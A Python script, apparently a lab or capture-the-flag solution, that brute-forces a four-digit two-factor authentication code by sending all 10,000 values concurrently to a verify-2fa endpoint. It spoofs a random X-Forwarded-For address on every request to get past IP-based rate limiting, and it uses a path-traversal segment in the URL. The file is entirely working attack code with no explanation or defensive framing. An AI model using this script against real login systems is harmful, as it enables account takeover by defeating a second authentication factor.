import aiohttp
import asyncio
import random

url = 'http://0.0.0.0/auth/test/../verify-2fa'
headers_template = {"Content-Type": "application/x-www-form-urlencoded"}

list_numbers = [f'{i:04d}' for i in range(10000)]

def create_fake_header():
    fake_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    return {"X-Forwarded-For": fake_ip, "Content-Type": "application/x-www-form-urlencoded"}

async def send_request(session, code):
    headers = create_fake_header()
    data = f'2fa-code={code}'
    async with session.post(url, headers=headers, data=data, allow_redirects=False) as response:
        status_code = response.status
        print(f"Request - Status Code: {status_code}, 2FA Code: {code}")

        if status_code == 302:
            print(f"Found 2FA code: {code}")
            response_text = await response.text()
            print(f"Response Body: {response_text}")
            print("Response Headers:")
            for header, value in response.headers.items():
                print(f"{header}: {value}")

            return True

        if status_code == 403:
            print("Received 403 status code. Stopping requests.")
            return True

        if status_code == 200:
            response_text = await response.text()
            print(f"Response Body: {response_text}")

        return False

async def make_requests():
    total_requests = 0

    async with aiohttp.ClientSession() as session:
        chunk_size = 20
        start = 0

        while start < len(list_numbers):
            end = min(start + chunk_size, len(list_numbers))
            codes = list_numbers[start:end]

            tasks = [send_request(session, code) for code in codes]
            results = await asyncio.gather(*tasks)

            if any(results):
                print("Exiting.")
                break

            total_requests += len(codes)

            print(f"Total Requests: {total_requests}")

            #await asyncio.sleep(0.2)

            start += chunk_size

asyncio.run(make_requests())
